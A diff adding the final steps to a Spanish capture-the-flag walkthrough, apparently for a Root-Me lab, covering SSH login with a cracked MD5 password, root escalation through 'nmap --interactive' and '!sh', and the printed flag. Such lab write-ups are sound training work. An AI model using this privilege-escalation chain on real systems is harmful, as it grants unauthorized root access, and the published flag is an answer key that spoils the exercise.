@@ -121,3 +121,27 @@ john --format=Raw-MD5 --wordlist=/home/whoami/crackMD5.txt hash.txt
 ![15](https://user-images.githubusercontent.com/75953873/173258477-324ff102-6b01-4c81-807b-6148b9fccbdd.png)
 
 Clave desencriptada: 	`abcdefghijklmnopqrstuvwxyz`
+
+- *Paso 10:* Acceder al servidor SSH remotamente, la contraseña es el hash descifrado.
+```
+ssh robot@ctf14.root-me.org 
+```
+![16](https://user-images.githubusercontent.com/75953873/173258600-90109f0c-79be-4b1d-b7a4-81e1f00e221f.png)
+
+Entramos al direcorio `/usr/local/bin` e interactuamos con nmap.
+```
+cd /usr/local/bin
+nmap --interactive
+```
+![18](https://user-images.githubusercontent.com/75953873/173258664-e6ba0c73-db36-4979-8844-351e89df0eeb.png)
+
+Por último, escalamos privilegios con nmap y extraemos la llave (flag) del fichero `passwd`.
+```
+!sh
+cat /passwd
+```
+![19](https://user-images.githubusercontent.com/75953873/173258754-b48703a8-ceef-46df-bd32-1979ec294639.png)
+
+**KEY:** 9e5ddd93d307150a16a03d56ff319c6d
+
+![8](https://user-images.githubusercontent.com/75953873/172520842-29a1669f-f89d-44b4-a818-297d7b1b472f.png)
